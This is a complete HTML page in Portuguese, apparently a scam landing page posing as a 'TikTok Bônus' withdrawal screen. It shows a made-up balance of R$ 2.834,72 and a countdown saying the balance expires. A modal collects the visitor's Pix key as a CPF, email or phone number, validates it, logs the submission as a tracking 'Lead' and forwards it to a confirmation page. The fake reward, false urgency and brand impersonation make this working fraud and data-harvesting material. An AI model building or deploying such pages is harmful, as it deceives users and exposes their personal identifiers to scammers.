<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Sacar — TikTok Bônus</title>
  <link rel="icon" href="assets/icon-light-32x32.png">
  <link rel="stylesheet" href="assets/_next/static/chunks/8a80e7184ad3a13f.css">
  <link rel="stylesheet" href="assets/_next/static/chunks/d53fa3d4da85ccbf.css">
  <script src="assets/tiktok-pixel-config.js"></script>
  <script src="assets/tiktok-pixel.js"></script>
</head>
<body class="font-sans antialiased">
  <main class="relative min-h-screen">
    <div class="relative mx-auto flex min-h-screen max-w-[390px] flex-col bg-[#F3F4F6]">
      <div class="border-b border-[#E5E7EB] bg-white px-5 py-3 text-center">
        <p class="text-[14px] font-bold tracking-wide text-[#1A1A1A]">O SEU SALDO EXPIRA EM: 04:47</p>
      </div>
      <div class="bg-white px-5 pb-4 pt-4">
        <h1 class="text-center text-[20px] font-bold text-[#1A1A1A]">Resgatar recompensas</h1>
      </div>
      <div class="px-4 pb-3 pt-1">
        <div class="relative overflow-hidden rounded-2xl bg-[#1A1A1A] px-5 pb-4 pt-5">
          <p class="text-[13px] text-[#A0A0A0]">Seu saldo</p>
          <p class="mt-1 text-[28px] font-bold text-white" style="letter-spacing: -0.5px;">R$ 2.834,72</p>
        </div>
      </div>
      <div class="mx-4 rounded-2xl bg-white px-5 pb-5 pt-4">
        <h2 class="text-[17px] font-bold text-[#1A1A1A]">Sacar dinheiro</h2>
        <p class="mt-2 text-[13px] text-[#666]">Transferência via Pix</p>
        <div class="mt-4 w-full rounded-xl border border-[#EA3E5E] py-3 text-center">
          <span class="text-[16px] font-medium text-[#EA3E5E]">R$ 2.834,72</span>
        </div>
        <a href="saldo.html" class="mt-4 block w-full rounded-xl py-3.5 text-center text-[16px] font-bold text-white" style="background: rgb(234, 62, 94); text-decoration: none;">Sacar dinheiro</a>
      </div>
    </div>

    <!-- Modal: Adicionar método de saque / Chave PIX -->
    <div id="modal-pix" class="fixed inset-0 z-50 flex items-end justify-center" style="background: rgba(0,0,0,0.5);">
      <div class="relative z-10 w-full max-w-[390px] rounded-t-2xl bg-white pb-10 pt-3">
        <div class="flex justify-center">
          <div class="h-[4px] w-[40px] rounded-full bg-[#D1D5DB]"></div>
        </div>
        <h2 class="mt-4 px-6 text-center text-[18px] font-bold text-[#1A1A1A]">Chave Pix</h2>
        <p class="mt-1 px-6 text-center text-[13px] text-[#666]">Escolha o tipo e digite sua chave</p>
        <div class="mx-6 mt-5 border-t border-[#E5E7EB]"></div>

        <div class="mt-4 flex gap-2 px-6">
          <button type="button" data-type="email" class="pix-type flex-1 rounded-xl border-2 border-[#E5E7EB] py-2.5 text-[14px] font-medium text-[#666]">Email</button>
          <button type="button" data-type="numero" class="pix-type flex-1 rounded-xl border-2 border-[#E5E7EB] py-2.5 text-[14px] font-medium text-[#666]">Número</button>
          <button type="button" data-type="cpf" class="pix-type flex-1 rounded-xl border-2 py-2.5 text-[14px] font-medium text-white" style="border-color: rgb(234, 62, 94); background: rgb(234, 62, 94);">CPF</button>
        </div>

        <div class="mt-4 px-6">
          <label id="pix-label" class="block text-[13px] font-medium text-[#333]">CPF</label>
          <input id="pix-input" type="text" inputmode="numeric" placeholder="000.000.000-00" maxlength="14" class="mt-2 w-full border-b border-[#E5E7EB] bg-transparent py-2 text-[16px] outline-none placeholder:text-[#999]">
          <p id="pix-error" class="mt-1.5 min-h-[20px] text-[12px] text-[#E8453C]"></p>
        </div>

        <div class="mt-6 px-6">
          <button id="btn-enviar" type="button" class="w-full rounded-xl py-4 text-[16px] font-bold text-white transition-colors" style="background: rgb(234, 62, 94);">Enviar</button>
        </div>
      </div>
    </div>
  </main>

  <script>
    (function() {
      var types = document.querySelectorAll('.pix-type');
      var input = document.getElementById('pix-input');
      var label = document.getElementById('pix-label');
      var error = document.getElementById('pix-error');
      var btnEnviar = document.getElementById('btn-enviar');
      var currentType = 'cpf';

      function formatCPF(v) {
        var d = v.replace(/\D/g, '');
        return d.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
      }
      function formatPhone(v) {
        var d = v.replace(/\D/g, '').slice(0, 11);
        return d.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2');
      }

      function validarCPF(cpf) {
        var d = cpf.replace(/\D/g, '');
        if (d.length !== 11) return false;
        if (/^(\d)\1+$/.test(d)) return false;
        var s = 0, i;
        for (i = 0; i < 9; i++) s += parseInt(d.charAt(i), 10) * (10 - i);
        var r = (s * 10) % 11; if (r === 10) r = 0; if (r !== parseInt(d.charAt(9), 10)) return false;
        s = 0;
        for (i = 0; i < 10; i++) s += parseInt(d.charAt(i), 10) * (11 - i);
        r = (s * 10) % 11; if (r === 10) r = 0; if (r !== parseInt(d.charAt(10), 10)) return false;
        return true;
      }
      function validarEmail(v) { return v.indexOf('@') >= 0 && v.length > 5; }
      function validarNumero(v) { return v.replace(/\D/g, '').length === 11; }

      function setType(type) {
        currentType = type;
        types.forEach(function(t) {
          var isActive = t.getAttribute('data-type') === type;
          t.style.borderColor = isActive ? 'rgb(234, 62, 94)' : '#E5E7EB';
          t.style.background = isActive ? 'rgb(234, 62, 94)' : 'transparent';
          t.style.color = isActive ? '#fff' : '#666';
        });
        if (type === 'email') {
          label.textContent = 'Email';
          input.type = 'email';
          input.inputmode = 'email';
          input.placeholder = 'seu@email.com';
          input.value = '';
          input.maxLength = 120;
        } else if (type === 'numero') {
          label.textContent = 'Número (celular)';
          input.type = 'tel';
          input.inputmode = 'numeric';
          input.placeholder = '(00) 00000-0000';
          input.value = '';
          input.maxLength = 15;
        } else {
          label.textContent = 'CPF';
          input.type = 'text';
          input.inputmode = 'numeric';
          input.placeholder = '000.000.000-00';
          input.value = '';
          input.maxLength = 14;
        }
        error.textContent = '';
        checkValid();
      }

      function checkValid() {
        var v = input.value.trim();
        var ok = false;
        if (currentType === 'email') ok = validarEmail(v);
        else if (currentType === 'numero') ok = validarNumero(v);
        else if (currentType === 'cpf') ok = validarCPF(v.replace(/\D/g, ''));
        btnEnviar.disabled = !ok;
        btnEnviar.style.opacity = ok ? '1' : '0.6';
        btnEnviar.style.cursor = ok ? 'pointer' : 'not-allowed';
        return ok;
      }

      input.addEventListener('input', function() {
        if (currentType === 'cpf') input.value = formatCPF(input.value);
        else if (currentType === 'numero') input.value = formatPhone(input.value);
        error.textContent = '';
        checkValid();
      });

      input.addEventListener('blur', function() {
        var v = input.value.trim();
        if (currentType === 'email' && v && !validarEmail(v)) error.textContent = 'Digite um email válido (com @).';
        else if (currentType === 'numero' && v && !validarNumero(v)) error.textContent = 'O número deve ter 11 dígitos.';
        else if (currentType === 'cpf' && v && !validarCPF(v.replace(/\D/g, ''))) error.textContent = 'Digite um CPF válido.';
      });

      types.forEach(function(t) {
        t.addEventListener('click', function() { setType(t.getAttribute('data-type')); });
      });

      setType('cpf');

      btnEnviar.addEventListener('click', function() {
        if (!checkValid()) return;
        var v = input.value.trim();
        if (currentType === 'email' && !validarEmail(v)) { error.textContent = 'Digite um email válido (com @).'; return; }
        if (currentType === 'numero' && !validarNumero(v)) { error.textContent = 'O número deve ter 11 dígitos.'; return; }
        if (currentType === 'cpf' && !validarCPF(v.replace(/\D/g, ''))) { error.textContent = 'Digite um CPF válido.'; return; }
        if (typeof ttq !== 'undefined') {
          ttq.track('Lead', { event_id: 'lead_' + Date.now() + '_' + Math.random().toString(36).slice(2, 9), url: window.location.href });
        }
        var chave = encodeURIComponent(v);
        var tipo = currentType;
        window.location.href = 'saque-confirmado.html?tipo=' + tipo + '&chave=' + chave;
      });

      if (typeof ttq !== 'undefined') {
        ttq.track('ViewContent', { content_id: 'sacar-chave-pix', content_name: 'Sacar dinheiro', content_type: 'product', value: 2834.72, currency: 'BRL' });
      }
      checkValid();
    })();
  </script>
</body>
</html>
